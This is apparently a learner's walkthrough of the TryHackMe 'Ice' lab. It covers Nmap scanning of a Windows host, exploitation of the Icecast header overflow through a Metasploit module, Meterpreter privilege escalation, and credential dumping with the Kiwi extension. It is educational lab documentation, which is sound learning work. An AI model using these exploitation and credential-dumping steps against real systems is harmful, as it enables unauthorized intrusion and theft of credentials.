TryHackMe – Ice Room | Windows Exploitation Lab

Practical Cybersecurity Learning Documentation

Platform: TryHackMe
Room: Ice
Difficulty: Easy
Target OS: Windows
Environment: Kali Linux
Category: Network Reconnaissance, Exploitation & Privilege Escalation

---

1. Introduction

Completed a practical learning walkthrough of the TryHackMe Ice room to understand Windows machine reconnaissance, service enumeration, vulnerability identification, exploitation and post-exploitation concepts.

The lab focuses on a vulnerable Icecast media server running on a Windows machine.

2. Tools Used

- Kali Linux
- Nmap
- Metasploit Framework
- Meterpreter
- OpenVPN
- TryHackMe

3. Network Reconnaissance

Started by connecting to the TryHackMe VPN and deploying the target machine.

Checked network interfaces:

ip -br addr

Performed an Nmap scan to identify open ports and services:

nmap -sV -sC -p- TARGET_IP

Key Findings

Port| Service
135| MSRPC
139| NetBIOS
445| SMB
3389| MSRDP
8000| Icecast

Identified Hostname: DARK-PC

4. Vulnerability Identification

Identified the Icecast service running on port 8000.

Vulnerability: Icecast Header Buffer Overflow
CVE: CVE-2004-1561

Used Nmap vulnerability scripts for additional enumeration:

nmap -sV --script vuln TARGET_IP

5. Exploitation – Metasploit

Started the Metasploit Framework:

msfconsole

Searched for the Icecast exploit:

search icecast

Selected the relevant module:

use exploit/windows/http/icecast_header

Checked available options:

show options

Configured the target:

set RHOSTS TARGET_IP

Configured the callback address using the Kali VPN interface IP and attempted exploitation in the authorized lab.

6. Privilege Escalation

Studied Windows privilege escalation using Meterpreter.

Useful enumeration commands:

sysinfo
getuid
getpid

Used the local exploit suggester:

run post/multi/recon/local_exploit_suggester

Learned about Windows privilege escalation and the importance of identifying vulnerable processes and permissions.

7. Post-Exploitation & Credential Enumeration

Studied process enumeration and migration:

ps

Learned about the Windows printer spooler process:

spoolsv.exe

Explored Meterpreter's Kiwi extension:

load kiwi

Credential enumeration command:

creds_all

8. Important Commands Learned

Command| Purpose
"ip -br addr"| Check network interfaces
"nmap -sV"| Service version detection
"nmap -p-"| Scan all TCP ports
"nmap --script vuln"| Vulnerability enumeration
"msfconsole"| Launch Metasploit
"search icecast"| Search exploit modules
"show options"| View module options
"sysinfo"| View target system information
"getuid"| Check current user
"ps"| List processes
"load kiwi"| Load Kiwi extension

9. Key Learning Outcomes

Through this practical lab, I explored:

- Network reconnaissance using Nmap.
- Open port and service identification.
- Vulnerability research using CVE references.
- Metasploit framework fundamentals.
- Windows exploitation concepts.
- Privilege escalation methodology.
- Meterpreter commands and process enumeration.
- Post-exploitation concepts.

10. Conclusion

The TryHackMe Ice room provided practical exposure to Windows penetration testing concepts and helped strengthen my understanding of reconnaissance, vulnerability identification and exploitation workflows.

This documentation is part of my ongoing cybersecurity and ethical hacking learning journey.

Learning by doing. Improving step by step.

---

Disclaimer: This documentation is for educational purposes only. All security testing should be performed on authorized lab environments such as TryHackMe.

#CyberSecurity #TryHackMe #KaliLinux #Nmap #Metasploit #EthicalHacking #PenetrationTesting #WindowsSecurity #LearningJourney
